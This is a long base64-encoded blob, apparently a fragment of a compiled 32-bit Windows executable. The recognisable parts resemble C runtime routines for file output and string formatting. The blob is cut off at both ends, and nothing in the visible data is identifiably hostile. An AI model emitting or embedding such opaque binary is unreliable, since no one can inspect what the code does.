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vTjl//+LhRzl//8DvSzl//85hSTl//8PjCEBAACDvUDl//8AD4TaAAAAagCNhSTl//9QagGNRfRQi4Uw5f//xkX0DYsEhQBJARD/NAb/FSzAABCFwA+EjwQAAIO9JOX//wEPjNYAAAD/hSzl//9H6ZAAAACA+wF0BYD7AnUzD7cBM9JmO4UY5f//iYU85f//i4U45f//D5TCg8ECg8ACiY005f//iYU45f//iZVA5f//gPsBdAWA+wJ1Vf+1POX//+gxIwAAWWY7hTzl//8PhRYEAACDxwKDvUDl//8AdCRqDVhQiYU85f//6AgjAABZZjuFPOX//w+F7QMAAEf/hSzl//+LhTjl//+LjTTl//87RRAPgsT9///rI4udMOX//4oCiwydAEkBEEeIRA40iwSdAEkBEMdEBjgBAAAAi7VA5f//6akDAACLtUDl///pqAMAAIuFMOX//4sEhQBJARD2RAYEgA+EVQMAAIuVROX//zP2ibU45f//hNsPheEAAACLwomFPOX//zl1EA+GkQMAADPJK8KLlTzl//+NnUjl//+JjUDl//87RRBzRIoKQkCIjSPl//+A+QqLjUDl//+JlTzl//91C/+FLOX//8YDDUNBipUj5f//iBOLlTzl//9DQYmNQOX//4H5/xMAAHK3i40U5f//jYVI5f//K9hqAI2FKOX//1BTjYVI5f//UIuFMOX//4sEhQBJARD/NAH/FSzAABCFwA+EuwIAAAO9KOX//4uVROX//zmdKOX//w+MsQIAAIuFPOX//yvCO0UQi4U85f//D4I1////6ZUCAACLyoD7Ag+F/gAAAImNQOX//zl1EA+GpwIAAMeFGOX//woAAACDpRzl//8Ai70s5f//i8ErwouVHOX//42dSOX//ztFEHM+D7cxg8ECg8ACiY1A5f//Zju1GOX//3UVag1ZZokLi41A5f//g8cCg8MCg8ICZokzg8ICg8MCgfr+EwAAcr2LjRTl//+NhUjl//8r2GoAjYUo5f//UFONhUjl//9Qi4Uw5f//ib0s5f//iwSFAEkBEP80Af8VLMAAEIu1OOX//4u9POX//4XAD4S0AQAAA70o5f//i5VE5f//ib085f//OZ0o5f//D4ykAQAAi41A5f//i8ErwjtFEA+CIP///+mMAQAAi10QiY0k5f//hdsPhKcBAADHhRjl//8K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D4R+BwAAM8CJhcT9///rAjPAiYW8/f//jYWI/f//UA+2wVDoEwwAAFlZhcB0OI2F3P3//1D/tdT9////tbT9///ovwcAAIuNzP3//4PEDIoBQYiFtP3//4mNzP3//4TAD4RJBwAAjYXc/f//UP+11P3///+1tP3//+iHBwAAg8QM6fgGAAAPvsGD+GQPj80BAAAPhFECAACD+FMPj+0AAAB0fIPoQXQQSEh0VkhIdAhISA+FGAUAAIDBIMeFoP3//wEAAACIjfP9//+LheD9//+Dy0C6AAIAAImd7P3//4219P3//4mVwP3//4XAD4kyAgAAx4Xg/f//BgAAAOmAAgAA98MwCAAAD4WeAAAAgcsACAAAiZ3s/f//6Y0AAAD3wzAIAAB1DIHLAAgAAImd7P3//4uV4P3//7n///9/g/r/dAKLyos3g8cEib3o/f//98MQCAAAD4RTBAAAhfZ1Bos15DABEMeFvP3//wEAAACLxoXJdA8z0klmORB0B4PAAoXJdfMrxtH46TwEAACD6FgPhLACAABISHRwg+gHD4Qn////SEgPhSQEAACDxwSJvej9///3wxAIAAB0MA+3R/xQaAACAACNhfT9//9QjYXk/f//UOjfCwAAg8QQhcB0H8eFuP3//wEAAADrE4pH/IiF9P3//8eF5P3//wEAAACNtfT9///pxQMAAIsHg8cEib3o/f//hcB0M4twBIX2dCwPvwD3wwAIAAB0FJkrwtH4x4W8/f//AQAAAOmKAwAAM8mJjbz9///pfQMAAIs14DABEFbo96H//1npawMAAIP4cA+P4wEAAA+EzwEAAIP4ZQ+MWQMAAIP4Zw+OS/7//4P4aXRkg/hudCWD+G8PhT0DAADHheT9//8IAAAAhNt5W4HLAAIAAImd7P3//+tNg8cEib3o/f//i3/86MIJAACFwA+E5wQAAIuF3P3///bDIHQFZokH6wKJB8eFuP3//wEAAADpegQAAIPLQImd7P3//8eF5P3//woAAAD3wwCAAAB1DPfDABAAAA+EjgEAAIsPg8cIib3o/f//i3/8M/bprgEAAHURgPlndVbHheD9//8BAAAA60o7wn4Ii8KJheD9//89owAAAH43jbhdAQAAV+jwrf//WYqN8/3//4mFsP3//4XAdAqL8Im9wP3//+sKx4Xg/f//owAAAIu96P3//4sHg8cIiYWA/f//i0f8iYWE/f//jYWI/f//UP+1oP3//w++wf+14P3//4m96P3//1D/tcD9//+NhYD9//9WUP81CDQBEP8VSMAAEP/Qi/uDxByB54AAAAB0IYO94P3//wB1GI2FiP3//1BW/zUUNAEQ/xVIwAAQ/9BZWYC98/3//2d1HIX/dRiNhYj9//9QVv81EDQBEP8VSMAAEP/QWVmAPi0PhSj+//+BywABAACJnez9//9G6Rb+///HheD9//8IAAAAagfrHIPocw+E3/z//0hID4SW/v//g+gDD4VrAQAAaidYiYWs/f//x4Xk/f//EAAAAITbD4l8/v//BFHGhdj9//8wiIXZ/f//x4XQ/f//AgAAAOle/v//g8cEM/aJvej9///2wyB0EfbDQHQGD79H/OsOD7dH/OsI9sNAdAqLR/yZi8iL+usFi0/8i/72w0B0HDv+fxh8BDvOcxL32RP+99+BywABAACJnez9///3wwCQAAB1Aov+i5Xg/f//hdJ5BTPSQusUg+P3uAACAACJnez9//870H4Ci9CLwQvHdQaJtdD9//+NdfOLwkqJleD9//+FwH8Gi8ELx3Q9i4Xk/f//mVJQV1HojQgAAIPBMImdnP3//4mFwP3//4v6g/k5fgYDjaz9//+LleD9//+IDouNwP3//07rsIud7P3//41F8yvGRomF5P3///fDAAIAAHQ2hcB0BYA+MHQtTv+F5P3//8YGMOshhfZ1Bos14DABEIvG6wdJgDgAdAVAhcl19SvGiYXk/f//g724/f//AA+FhgEAAPbDQHQ198MAAQAAdAnGhdj9//8t6xr2wwF0CcaF2P3//yvrDPbDAnQRxoXY/f//IMeF0P3//wEAAACLvcj9//8rveT9//+LhdD9//8r+PbDDHUejYXc/f//UP+11P3//1dqIOgGAgAAi4XQ/f//g8QQ/7Wo/f//jY3c/f//Uf+11P3//1CNhdj9//9Q6AkCAACDxBT2wwh0HfbDBHUYjYXc/f//UP+11P3//1dqMOi7AQAAg8QQg728/f//AIuF5P3//3R9hcB+eYvOSImFwP3//w+3AVBqBo1F9FCNhaT9//+DwQJQiY2c/f//6OsGAACDxBCFwHU/OYWk/f//dDf/taj9//+Nhdz9//9Q/7XU/f//jUX0/7Wk/f//UOh4AQAAi4XA/f//i42c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